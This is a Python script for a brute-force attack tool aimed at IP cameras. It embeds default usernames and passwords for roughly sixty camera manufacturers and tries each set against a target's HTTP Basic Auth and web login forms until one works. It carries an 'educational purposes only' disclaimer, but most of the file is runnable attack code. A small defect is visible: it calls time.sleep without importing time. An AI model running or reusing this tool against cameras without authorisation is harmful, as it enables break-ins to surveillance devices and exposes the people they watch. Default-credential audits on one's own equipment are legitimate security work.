#!/usr/bin/env python3
"""
Brand-Specific Camera Brute Force Tool
Target specific camera manufacturers with their known default credentials
Educational purposes only - use responsibly on devices you own or have permission to test.
"""

import argparse
from camera_bruteforce import CameraBruteForcer

class BrandSpecificBruteForcer(CameraBruteForcer):
    def __init__(self, target_url, delay=1, timeout=10):
        super().__init__(target_url, delay, timeout)
        
        # Brand-specific credential databases
        self.brand_credentials = {
            'acti': [
                ('Admin', '123456'),
                ('admin', '123456')
            ],
            'american_dynamics': [
                ('admin', 'admin'),
                ('admin', '9999')
            ],
            'arecont': [
                ('admin', '')
            ],
            'avigilon': [
                ('admin', 'admin'),
                ('Administrator', '')
            ],
            'axis': [
                ('root', 'pass'),
                ('root', '')
            ],
            'basler': [
                ('admin', 'admin')
            ],
            'bosch': [
                ('service', 'service'),
                ('Dinion', '')
            ],
            'brickcom': [
                ('admin', 'admin')
            ],
            'canon': [
                ('root', 'camera')
            ],
            'cbc_ganz': [
                ('admin', 'admin')
            ],
            'cnb': [
                ('root', 'admin')
            ],
            'costar': [
                ('root', 'root')
            ],
            'dahua': [
                ('admin', 'admin'),
                ('888888', '888888'),
                ('666666', '666666')
            ],
            'digital_watchdog': [
                ('admin', 'admin')
            ],
            'drs': [
                ('admin', '1234')
            ],
            'dvtel': [
                ('Admin', '1234')
            ],
            'dynacolor': [
                ('Admin', '1234')
            ],
            'flir': [
                ('admin', 'fliradmin'),
                ('admin', 'admin')
            ],
            'foscam': [
                ('admin', '')
            ],
            'geovision': [
                ('admin', 'admin')
            ],
            'grandstream': [
                ('admin', 'admin')
            ],
            'gvi': [
                ('Admin', '1234')
            ],
            'hikvision': [
                ('admin', '12345')
            ],
            'honeywell': [
                ('administrator', '1234'),
                ('admin', '1234')
            ],
            'intellio': [
                ('admin', 'admin')
            ],
            'ioimage': [
                ('admin', 'admin')
            ],
            'ipx_ddk': [
                ('root', 'admin'),
                ('root', 'Admin')
            ],
            'iqinvision': [
                ('root', 'system')
            ],
            'jvc': [
                ('admin', 'jvc')
            ],
            'march_networks': [
                ('admin', '')
            ],
            'merit_lilin_camera': [
                ('admin', 'pass')
            ],
            'merit_lilin_recorder': [
                ('admin', '1111')
            ],
            'mobotix': [
                ('admin', 'meinsm')
            ],
            'nothern': [
                ('admin', '12345')
            ],
            'panasonic': [
                ('admin', '12345'),
                ('admin1', 'password')
            ],
            'pelco': [
                ('admin', 'admin')
            ],
            'pixord': [
                ('admin', 'admin'),
                ('root', 'pass')
            ],
            'qvis': [
                ('Admin', '1234')
            ],
            'samsung': [
                ('root', '4321'),
                ('root', 'root'),
                ('admin', '1111111'),
                ('root', 'admin'),
                ('admin', '4321')
            ],
            'sanyo': [
                ('admin', 'admin')
            ],
            'scallop': [
                ('admin', 'password')
            ],
            'sentry360': [
                ('Admin', '1234'),
                ('admin', '1234')
            ],
            'sony': [
                ('admin', 'admin')
            ],
            'speco': [
                ('root', 'root'),
                ('admin', 'admin'),
                ('admin', '1234')
            ],
            'stardot': [
                ('admin', 'admin')
            ],
            'starvedia': [
                ('admin', '')
            ],
            'toshiba': [
                ('root', 'ikwb')
            ],
            'trendnet': [
                ('admin', 'admin')
            ],
            'ubiquiti': [
                ('ubnt', 'ubnt')
            ],
            'uniview': [
                ('admin', '123456')
            ],
            'verint': [
                ('admin', 'admin')
            ],
            'videoiq': [
                ('supervisor', 'supervisor')
            ],
            'vivotek': [
                ('root', '')
            ],
            'wbox': [
                ('admin', 'wbox123')
            ],
            'wodsee': [
                ('admin', '')
            ]
        }
    
    def get_brand_credentials(self, brand):
        """Get credentials for a specific brand"""
        brand_lower = brand.lower().replace('-', '_').replace(' ', '_')
        return self.brand_credentials.get(brand_lower, [])
    
    def list_supported_brands(self):
        """List all supported camera brands"""
        print("Supported Camera Brands:")
        print("=" * 50)
        
        for brand, creds in self.brand_credentials.items():
            brand_display = brand.replace('_', ' ').title()
            print(f"{brand_display:<25} - {len(creds)} credential(s)")
        
        print(f"\nTotal brands supported: {len(self.brand_credentials)}")
    
    def run_brand_attack(self, brand):
        """Run attack against specific brand"""
        credentials = self.get_brand_credentials(brand)
        
        if not credentials:
            print(f"❌ Brand '{brand}' not found in database")
            print("Use --list-brands to see supported brands")
            return
        
        brand_display = brand.replace('_', ' ').title()
        print(f"🎯 Testing {brand_display} camera credentials")
        print(f"Target: {self.target_url}")
        print(f"Credentials to test: {len(credentials)}")
        print("-" * 60)
        
        # Discover interface first
        paths, auth_methods = self.discover_camera_interface()
        
        # Test HTTP Basic Auth first
        if 'HTTP Basic Auth' in auth_methods or not paths:
            print(f"Testing {brand_display} HTTP Basic Authentication...")
            for username, password in credentials:
                result = self.test_http_basic_auth(username, password)
                self.print_result(result)
                
                if result['success']:
                    print(f"🎯 SUCCESS! {brand_display} credentials work: {username}:{password}")
                    return True
                
                time.sleep(self.delay)
        
        # Test form-based login if paths were discovered
        if paths:
            print(f"Testing {brand_display} form-based authentication...")
            for path in paths:
                for username, password in credentials:
                    result = self.test_form_login(username, password, path)
                    if result.get('success'):
                        self.print_result(result)
                        print(f"🎯 SUCCESS! {brand_display} credentials work: {username}:{password}")
                        return True
                    time.sleep(self.delay)
        
        print(f"❌ No working {brand_display} credentials found")
        return False

def main():
    parser = argparse.ArgumentParser(description='Brand-Specific Camera Brute Force Tool')
    parser.add_argument('url', nargs='?', help='Target camera/device URL')
    parser.add_argument('-b', '--brand', help='Camera brand to test')
    parser.add_argument('-d', '--delay', type=float, default=2.0,
                       help='Delay between requests (seconds, default: 2.0)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds')
    parser.add_argument('--list-brands', action='store_true',
                       help='List all supported camera brands')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    
    args = parser.parse_args()
    
    if args.list_brands:
        bruter = BrandSpecificBruteForcer('http://example.com')
        bruter.list_supported_brands()
        return
    
    if not args.url:
        print("❌ URL is required unless using --list-brands")
        parser.print_help()
        return
    
    if not args.brand:
        print("❌ Brand is required. Use --list-brands to see supported brands")
        return
    
    # Validate URL
    from urllib.parse import urlparse
    parsed_url = urlparse(args.url)
    if not parsed_url.scheme:
        args.url = 'http://' + args.url
    
    print("🎥 Brand-Specific Camera Brute Force Tool")
    print("=" * 50)
    print("⚠️  Educational purposes only!")
    print("⚠️  Use only on devices you own or have permission to test!")
    print("=" * 50)
    
    # Initialize brute forcer
    bruter = BrandSpecificBruteForcer(args.url, args.delay, args.timeout)
    
    try:
        success = bruter.run_brand_attack(args.brand)
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
        success = False
    
    # Print results
    print("\n" + "=" * 60)
    print("BRAND-SPECIFIC ATTACK RESULTS")
    print("=" * 60)
    print(f"Brand: {args.brand.replace('_', ' ').title()}")
    print(f"Total attempts: {bruter.total_attempts}")
    print(f"Failed attempts: {bruter.failed_attempts}")
    print(f"Successful logins: {len(bruter.successful_logins)}")
    
    if bruter.successful_logins:
        print("\n🎯 SUCCESSFUL BRAND CREDENTIALS:")
        for login in bruter.successful_logins:
            print(f"  ✓ {login['username']}:{login['password']} ({login['method']})")
    else:
        print(f"\n❌ No working {args.brand} credentials found")
        print("This could mean:")
        print("  - The device is not from this manufacturer")
        print("  - Default credentials have been changed")
        print("  - The device uses different authentication")
    
    # Save results
    if args.output:
        from advanced_bruteforce import save_results
        save_results(bruter, args.output)

if __name__ == "__main__":
    main()